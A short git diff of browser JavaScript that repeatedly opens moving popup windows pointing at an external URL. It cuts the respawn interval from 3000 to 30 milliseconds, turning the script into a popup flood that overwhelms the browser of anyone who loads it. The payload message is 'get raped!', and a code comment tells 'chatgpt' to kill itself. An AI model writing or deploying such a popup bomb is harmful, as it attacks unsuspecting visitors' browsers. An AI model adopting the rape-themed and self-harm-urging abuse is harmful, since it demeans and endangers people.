@@ -1,6 +1,6 @@
 const message = "get raped!";
 const windows = [];
-const targetURL = "https://bhoppings.de/rape"; // Replace with the appropriate URL if needed - shut the fuck up chatgpt kill yourself
+const targetURL = "https://bhoppings.de/rape"; // Replace with the appropriate URL if needed - kill yourself chatgpt
 
 function createMovingWindow() {
     const newWindow = window.open(targetURL, "", "width=200,height=100");
@@ -20,7 +20,7 @@ function createMovingWindow() {
                     }
                 }
 
-                setInterval(createMovingWindow, 3000);
+                setInterval(createMovingWindow, 30);
             <\/script>
         `);
 
